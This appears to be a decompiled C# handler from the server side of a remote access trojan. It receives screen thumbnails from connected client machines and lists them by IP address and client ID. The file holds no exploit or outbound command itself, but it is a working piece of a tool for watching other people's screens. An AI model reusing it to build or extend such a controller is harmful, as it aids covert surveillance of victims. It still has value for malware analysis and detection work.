﻿using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000057 RID: 87
	public class HandleThumbnails
	{
		// Token: 0x060001D5 RID: 469 RVA: 0x000114C4 File Offset: 0x0000F6C4
		public HandleThumbnails(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				if (client.LV2 == null)
				{
					client.LV2 = new ListViewItem();
					client.LV2.Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(new char[]
					{
						':'
					})[1]);
					client.LV2.ToolTipText = client.ID;
					client.LV2.Tag = client;
					using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
					{
						Program.form1.ThumbnailImageList.Images.Add(client.ID, Image.FromStream(memoryStream));
						client.LV2.ImageKey = client.ID;
						object lockListviewThumb = Settings.LockListviewThumb;
						lock (lockListviewThumb)
						{
							Program.form1.listView3.Items.Add(client.LV2);
						}
						goto IL_17B;
					}
				}
				using (MemoryStream memoryStream2 = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
				{
					object lockListviewThumb = Settings.LockListviewThumb;
					lock (lockListviewThumb)
					{
						Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
						Program.form1.ThumbnailImageList.Images.Add(client.ID, Image.FromStream(memoryStream2));
					}
				}
				IL_17B:;
			}
			catch
			{
			}
		}
	}
}
